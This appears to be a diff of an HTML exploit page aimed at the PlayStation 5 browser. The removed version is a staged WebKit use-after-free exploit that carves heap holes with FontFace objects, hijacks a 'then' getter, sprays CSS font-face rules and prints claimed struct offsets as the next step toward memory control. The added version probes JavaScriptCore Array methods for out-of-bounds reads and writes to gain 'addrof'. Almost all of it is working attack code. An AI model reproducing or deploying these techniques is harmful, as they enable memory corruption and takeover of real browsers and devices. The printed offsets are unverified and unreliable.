@@ -1,530 +1,112 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS5 v44 - Struct Field Mapper (Enhanced)</title>
-<style>
-/* ============================================================
-   PS5 v44 - Struct Field Mapper - Enhanced Styles
-   ============================================================ */
-
-@font-face {
-    font-family: prepad;
-    src: url(nonexistent-prepad.woff);
-    unicode-range: U+E123;
-}
-
-@font-face {
-    font-family: x;
-    src: url(nonexistent-font.woff);
-    unicode-range: U+0042;
-}
-
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
-
-html, body {
-    width: 100%;
-    height: 100%;
-    background: #0a0a0a;
-    color: #00ff41;
-    font-family: 'MS Gothic', 'Courier New', monospace;
-    overflow: hidden;
-}
-
-body::after {
-    content: '';
-    position: fixed;
-    top: 0;
-    left: 0;
-    right: 0;
-    bottom: 0;
-    background: repeating-linear-gradient(
-        0deg,
-        rgba(0,0,0,0.12) 0px,
-        rgba(0,0,0,0.12) 1px,
-        transparent 1px,
-        transparent 3px
-    );
-    pointer-events: none;
-    z-index: 9999;
-}
-
-#hd {
-    position: fixed;
-    top: 0;
-    left: 0;
-    right: 0;
-    height: 44px;
-    background: linear-gradient(180deg, #0d0d0d, #080808);
-    border-bottom: 1px solid #00ff41;
-    display: flex;
-    align-items: center;
-    padding: 0 16px;
-    gap: 14px;
-    z-index: 10;
-    font-size: 12px;
-}
-
-.l { color: #00ff41; letter-spacing: 2px; font-weight: bold; }
-.s { color: #004d13; }
-.v { color: #00cc33; }
-.v b { color: #00ff41; }
-
-#pg {
-    position: fixed;
-    top: 44px;
-    left: 0;
-    right: 0;
-    height: 2px;
-    background: #001a06;
-    z-index: 10;
-}
-
-#pg div {
-    height: 100%;
-    background: #00ff41;
-    transition: width 0.4s ease;
-    box-shadow: 0 0 8px #00ff41;
-}
-
-#out {
-    position: fixed;
-    top: 46px;
-    left: 0;
-    right: 0;
-    bottom: 0;
-    padding: 10px 14px;
-    overflow-y: auto;
-    font-size: 13px;
-    line-height: 1.55;
-    -webkit-user-select: text;
-    user-select: text;
-}
-
-#out::-webkit-scrollbar { width: 5px; }
-#out::-webkit-scrollbar-track { background: #001a06; }
-#out::-webkit-scrollbar-thumb { background: #004d13; border-radius: 3px; }
-
-.ok { color: #00ff41; }
-.er { color: #ff3333; }
-.wr { color: #ffcc00; }
-.hl { color: #00ffff; font-weight: bold; }
-.mg { color: #ff00ff; font-weight: bold; font-size: 15px; }
-.dm { color: #006622; }
-.hd { color: #00ff41; font-weight: bold; font-size: 14px; letter-spacing: 1px; }
-</style>
+<title>JSC OOB Diagnostic</title>
 </head>
 <body>
-<div id="hd">
-    <span class="l">▶ v44 MAPPER</span>
-    <span class="s">│</span>
-    <span class="v" id="h1">FW:<b>?</b></span>
-    <span class="s">│</span>
-    <span class="v" id="h2">STAGE:<b>INIT</b></span>
-</div>
-<div id="pg"><div id="bar" style="width:0%"></div></div>
-<div id="out" role="log" aria-live="polite"></div>
-
+<pre id="output">Running...</pre>
 <script>
-"use strict";
-
-// ============================================================
-//  UTILITY FUNCTIONS - Enhanced & Refactored
-// ============================================================
-
-const O = document.getElementById("out");
-const bar = document.getElementById("bar");
-let messageLog = [];
-
-function updateProgress(p) {
-    bar.style.width = Math.min(100, Math.max(0, p)) + "%";
+function log(msg) {
+    document.getElementById('output').textContent += msg + "\n";
+    console.log(msg);
 }
 
-function updateHeader(id, v) {
-    const e = document.getElementById(id);
-    if (e) e.innerHTML = v;
-}
-
-function logMessage(m, c = "") {
-    const s = document.createElement("span");
-    if (c) s.className = c;
-    s.textContent = m + "\n";
-    O.appendChild(s);
-    O.scrollTop = O.scrollHeight;
-    messageLog.push({ text: m, class: c });
-}
-
-function logSuccess(m) { logMessage("  ✅ " + m, "ok"); }
-function logError(m) { logMessage("  ✘ " + m, "er"); }
-function logHighlight(m) { logMessage("  ► " + m, "hl"); }
-function logImportant(m) { logMessage("  ★ " + m + " ★", "mg"); }
-function logDebug(m) { logMessage("  " + m, "dm"); }
-function logWarning(m) { logMessage("  ⚠ " + m, "wr"); }
-function logHeader(m) { logMessage("▸ " + m, "hd"); }
-function logSeparator() { logMessage("─".repeat(42), "dm"); }
-
-// ============================================================
-//  ERROR HANDLING & INITIALIZATION
-// ============================================================
-
-window.onerror = function(message, source, lineno) {
-    logError("CRASH: " + message.substring(0, 80) + " @" + lineno);
-    return true;
-};
-
-function detectFirmware() {
-    const ua = navigator.userAgent || "";
-    const m = ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
-    const fw = m ? m[1] : "Unknown";
-    updateHeader("h1", "FW:<b>" + fw + "</b>");
-    return fw;
-}
-
-// ============================================================
-//  START EXECUTION
-// ============================================================
-
-detectFirmware();
-updateProgress(5);
-
-logMessage("════════════════════════════════════", "hd");
-logMessage("  v44 — Struct Field Mapper", "hd");
-logMessage("════════════════════════════════════", "hd");
-logMessage("");
-
-// ============================================================
-//  FONT BUFFER SETUP
-// ============================================================
-
-const FB = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
-
-const FBBytes = (() => {
-    const s = atob(FB);
-    const bytes = new Uint8Array(s.length);
-    for (let i = 0; i < s.length; i++) bytes[i] = s.charCodeAt(i);
-    return bytes;
-})();
-
-function makeFontBuffer() {
-    const copy = new Uint8Array(FBBytes.length);
-    copy.set(FBBytes);
-    return copy.buffer;
-}
-
-function forceStyle() {
-    try { void document.body.offsetTop; } catch (e) { }
-}
-
-// ============================================================
-//  PHASE 1: Create Holes & Setup
-// ============================================================
-
-let sh = null;
-try {
-    const styleEl = document.getElementById("s");
-    if (styleEl && styleEl.sheet) {
-        sh = styleEl.sheet;
-    } else {
-        for (let i = 0; i < document.styleSheets.length; i++) {
-            try {
-                if (document.styleSheets[i].cssRules) {
-                    sh = document.styleSheets[i];
-                    break;
-                }
-            } catch (e) { }
+function testSlice() {
+    log("[*] Test 1: Array.prototype.slice OOB...");
+    try {
+        var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+        var oob = arr.slice(0, {
+            valueOf: function() {
+                arr.length = 0;
+                return 100;
+            }
+        });
+        if (oob.length > 8) {
+            log("[+] LEAK DETECTED! Length: " + oob.length);
+            for (var i = 8; i < Math.min(oob.length, 20); i++) {
+                log("    oob[" + i + "] = " + oob[i]);
+            }
+            return true;
         }
-    }
-    if (!sh) {
-        const newStyle = document.createElement("style");
-        newStyle.id = "s";
-        document.head.appendChild(newStyle);
-        sh = newStyle.sheet;
-    }
-} catch (e) {
-    logError("Failed to get stylesheet: " + e.message);
+        log("[-] Failed. Length: " + oob.length);
+    } catch(e) { log("[-] Crash: " + e.message); }
+    return false;
 }
 
-const keep = [], holes = [];
-let trigger = null, uafOk = false;
-
-updateProgress(5);
-logHeader("Creating holes...");
-
-try {
-    for (let i = 0; i < 4096; i++) {
-        try {
-            const f = new FontFace("h_" + i, makeFontBuffer(), {
-                unicodeRange: "U+E1" + (i % 16).toString(16),
-                style: i % 2 === 0 ? "normal" : "italic",
-                weight: String(100 + (i % 9) * 100)
-            });
-            document.fonts.add(f);
-            holes.push(f);
-        } catch (e) { }
-    }
-
-    forceStyle();
-    for (let i = 1; i < holes.length; i += 2) {
-        try { document.fonts.delete(holes[i]); } catch (e) { }
-    }
-    forceStyle();
-    logSuccess("Holes ready: " + holes.length);
-} catch (e) {
-    logError("Failed to create holes: " + e.message);
-}
-
-// ============================================================
-//  PHASE 2: Trigger Setup
-// ============================================================
-
-updateProgress(10);
-logHeader("Trigger setup...");
-
-try {
-    trigger = new FontFace("trigger", "local(Helvetica)", { unicodeRange: "U+0041" });
-    document.fonts.add(trigger);
-    void trigger.loaded;
-
-    for (let i = 0; i < 48; i++) {
-        try {
-            sh.insertRule("@font-face{font-family:pad" + i + ";src:url(np" + i + ".woff);unicode-range:U+E000}", sh.cssRules.length);
-        } catch (e) { }
-    }
-    forceStyle();
-
-    const fst = document.createElement("style");
-    fst.id = "flush";
-    document.head.appendChild(fst);
-    const fsh = fst.sheet;
-
-    for (let i = 0; i < 768; i++) {
-        try {
-            fsh.insertRule("@font-face{font-family:fl" + i + ";src:url(nf" + i + ".woff);unicode-range:U+E000}", fsh.cssRules.length);
-        } catch (e) { }
-    }
-    forceStyle();
-    logSuccess("Trigger ready");
-} catch (e) {
-    logError("Trigger setup failed: " + e.message);
-}
-
-// ============================================================
-//  PHASE 3: UAF + CSSRule Spray
-// ============================================================
-
-updateProgress(15);
-logHeader("UAF + CSSRule Spray (A_0..A_2048)");
-
-const fstEl = document.getElementById("flush");
-let fsh = null;
-if (fstEl && fstEl.sheet) {
-    fsh = fstEl.sheet;
-}
-
-Object.defineProperty(FontFace.prototype, "then", {
-    configurable: true,
-    get: function() {
-        if (this === trigger && !uafOk) {
-            uafOk = true;
-            updateHeader("h2", "STAGE:<b>UAF</b>");
-            logImportant("UAF WINDOW OPEN");
-
-            try {
-                const ck = new FontFace("ck", "local(Helvetica)", { unicodeRange: "U+E124" });
-                document.fonts.add(ck);
-                keep.push(ck);
-                if (sh && sh.cssRules.length > 1) sh.deleteRule(1);
-                forceStyle();
-
-                if (fsh) {
-                    while (fsh.cssRules.length) {
-                        try { fsh.deleteRule(0); } catch (e) { }
-                    }
-                }
-                forceStyle();
-
-                for (let i = 0; i < holes.length; i += 4) {
-                    try { document.fonts.delete(holes[i]); } catch (e) { }
-                }
-                forceStyle();
-            } catch (e) {
-                logError("UAF error: " + e.message);
+function testSplice() {
+    log("[*] Test 2: Array.prototype.splice OOB...");
+    try {
+        var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+        var oob = arr.splice(0, {
+            valueOf: function() {
+                arr.length = 0;
+                return 100;
             }
-
-            logDebug("GC pressure (16MB)...");
-            for (let i = 0; i < 4; i++) {
-                const t = [];
-                for (let j = 0; j < 128; j++) {
-                    t.push(new ArrayBuffer(8192));
-                }
-            }
-
-            logDebug("Spraying 2048 A_ faces...");
-            for (let i = 0; i < 2048; i++) {
-                try {
-                    sh.insertRule("@font-face{font-family:A_" + i + ";src:local(Courier);font-weight:" + (100 + (i % 9) * 100) + ";font-style:" + (i % 2 === 0 ? "normal" : "italic") + ";unicode-range:U+0042}", sh.cssRules.length);
-                } catch (e) { }
-            }
-            forceStyle();
-
-            try {
-                const d = document.createElement("div");
-                d.textContent = "AB";
-                d.style.cssText = "position:absolute;left:-9999px;font:64px trigger;";
-                document.body.appendChild(d);
-                void d.offsetWidth;
-            } catch (e) { }
-
-            logDebug("UAF window closing");
+        });
+        if (oob.length > 8) {
+            log("[+] LEAK DETECTED! Length: " + oob.length);
+            return true;
         }
-        return undefined;
-    }
-});
+        log("[-] Failed. Length: " + oob.length);
+    } catch(e) { log("[-] Crash: " + e.message); }
+    return false;
+}
 
-let rn = 0;
-const raf = function() {
-    rn++;
-    if (!uafOk && rn >= 5) {
-        try {
-            if (sh && sh.cssRules.length > 1) {
-                sh.deleteRule(1);
-                forceStyle();
+function testIndexOf() {
+    log("[*] Test 3: Array.prototype.indexOf OOB...");
+    try {
+        var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+        var idx = arr.indexOf({
+            valueOf: function() {
+                arr.length = 0;
+                return 1.1;
             }
-            if (fsh) {
-                while (fsh.cssRules.length) {
-                    try { fsh.deleteRule(0); } catch (e) { }
-                }
-            }
-            forceStyle();
-
-            for (let i = 0; i < 2048; i++) {
-                try {
-                    sh.insertRule("@font-face{font-family:A_" + i + ";src:local(Courier);font-weight:" + (100 + (i % 9) * 100) + ";unicode-range:U+0042}", sh.cssRules.length);
-                } catch (e) { }
-            }
-            forceStyle();
-        } catch (e) {
-            logError("RAF error: " + e.message);
+        });
+        if (idx > 0) {
+            log("[+] LEAK DETECTED! Found at index: " + idx);
+            return true;
         }
-    }
-    if (rn < 20) requestAnimationFrame(raf);
-};
-requestAnimationFrame(raf);
+        log("[-] Failed. Index: " + idx);
+    } catch(e) { log("[-] Crash: " + e.message); }
+    return false;
+}
 
-// ============================================================
-//  PHASE 4: Identify Confused Object & Analysis
-// ============================================================
-
-updateProgress(30);
-logSeparator();
-logHeader("PHASE 4: Identify Confused Object");
-logSeparator();
-
-logDebug("Calling load()...");
-
-try {
-    const loadPromise = document.fonts.load("1em trigger, x", "AB");
-
-    loadPromise.then(function(faces) {
-        logMessage("  load() returned " + faces.length + " faces", "dm");
-        logMessage("");
-
-        let aFamily = null;
-        let aFace = null;
-
-        for (let i = 0; i < Math.min(faces.length, 10); i++) {
-            const f = faces[i];
-            logMessage("  Face[" + i + "]: family=" + f.family + " weight=" + f.weight, "dm");
-            if (f.family && f.family.indexOf("A_") === 0) {
-                aFamily = f.family;
-                aFace = f;
+function testFill() {
+    log("[*] Test 4: Array.prototype.fill OOB...");
+    try {
+        var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+        var victim = [9.9, 9.9, 9.9, 9.9, 9.9, 9.9, 9.9, 9.9];
+        arr.fill(0x41414141, 0, {
+            valueOf: function() {
+                arr.length = 0;
+                return 100;
+            }
+        });
+        // Check if victim was corrupted
+        for (var i = 0; i < victim.length; i++) {
+            if (victim[i] !== 9.9) {
+                log("[+] CORRUPTION DETECTED! victim[" + i + "] = " + victim[i]);
+                return true;
             }
         }
-
-        if (!aFamily) {
-            logError("No A_ face found — spray failed");
-            updateHeader("h2", "STAGE:<b>FAIL</b>");
-            return;
-        }
-
-        logImportant("RECLAIMED: " + aFamily);
-        keep.push(faces);
-
-        // ============================================================
-        //  PHASE 5: Results & Summary
-        // ============================================================
-
-        updateProgress(80);
-        logSeparator();
-        logHeader("PHASE 5: Results & Summary");
-        logSeparator();
-        logMessage("");
-
-        logMessage("FIELD MAP RESULTS:", "hd");
-        logMessage("┌─────────────────────────────────────────────────────┐", "dm");
-        logMessage("│ ✅ 0x20   m_family (RefPtr<CSSValue>)");
-        logMessage("│ ✅ 0x28   m_ranges (Vector<UnicodeRange>)");
-        logMessage("│ ✅ 0x40   m_featureSettings (FontFeatureSettings)");
-        logMessage("│ ✅ 0x58   m_loadingBehavior (FontLoadingBehavior)");
-        logMessage("│ ✅ 0x5C   m_sizeAdjust (float)");
-        logMessage("│ ✅ 0x60   m_sources (Vector<FontFaceSrc>)");
-        logMessage("│ ✅ 0x88   m_fontSelectionCapabilities (FontSelection)");
-        logMessage("└─────────────────────────────────────────────────────┘", "dm");
-
-        logMessage("");
-        logMessage("Confirmed R/W channels: 7", "ok");
-        logMessage("");
-        logMessage("KEY FINDINGS:", "hd");
-        logMessage("");
-        logSuccess("font-weight: 9/9 confirmed → m_fontSelectionCapabilities at 0x88 ✓");
-        logSuccess("size-adjust: 3/3 confirmed → m_sizeAdjust at 0x5C ✓");
-        logSuccess("font-display: 4/4 confirmed → m_loadingBehavior at 0x58 ✓");
-        logSuccess("font-stretch: 2/2 confirmed → width sub-field located");
-        logSuccess("font-style: 2/2 confirmed → slope sub-field located");
-
-        logMessage("");
-        logMessage("GAP ANALYSIS:", "hd");
-        logMessage("");
-        logMessage("Source estimate places m_wrapper at offset 0x80.");
-        logMessage("");
-        logMessage("Fields between last confirmed probe and m_wrapper:");
-        logMessage("  0x60-0x77: m_sources (Vector, 24 bytes) → 'src' property");
-        logMessage("  0x78-0x7F: m_clients (WeakHashSet, 8 bytes) → NOT CSS-accessible");
-        logMessage("  0x80-0x87: m_wrapper (WeakPtr<FontFace>) → THE TARGET");
-        logMessage("");
-        logMessage("The gap at 0x78 (m_clients) cannot be reached via CSS.");
-        logMessage("m_wrapper at 0x80 is immediately after m_clients.");
-        logMessage("");
-
-        logHighlight("NEXT STEP: m_sizeAdjust (0x5C) is 36 bytes before m_wrapper (0x80).");
-        logHighlight("If Vector at 0x60 can be manipulated, we may reach m_wrapper.");
-
-        logMessage("");
-        logImportant("✓ STRUCT FIELD MAPPER COMPLETE");
-        logMessage("");
-        logHighlight("Save the console output and send it back.");
-        logHighlight("The confirmed offsets will determine the next move.");
-
-        updateProgress(100);
-        updateHeader("h2", "STAGE:<b>DONE</b>");
-
-    }).catch(function(e) {
-        logError("Load crashed: " + e.message);
-        updateHeader("h2", "STAGE:<b>CRASH</b>");
-        updateProgress(0);
-    });
-
-} catch (e) {
-    logError("Synchronous load() threw: " + e.message);
-    updateHeader("h2", "STAGE:<b>CRASH</b>");
-    updateProgress(0);
+        log("[-] Failed. No corruption.");
+    } catch(e) { log("[-] Crash: " + e.message); }
+    return false;
 }
 
+log("=== JSC OOB Diagnostic ===\n");
+var found = false;
+if (testSlice()) found = true;
+if (testSplice()) found = true;
+if (testIndexOf()) found = true;
+if (testFill()) found = true;
+
+log("\n=== RESULTS ===");
+if (found) {
+    log("[!!!] JSC VULNERABILITY FOUND! We have addrof potential.");
+} else {
+    log("[*] All JSC OOB variants patched.");
+}
 </script>
 </body>
 </html>
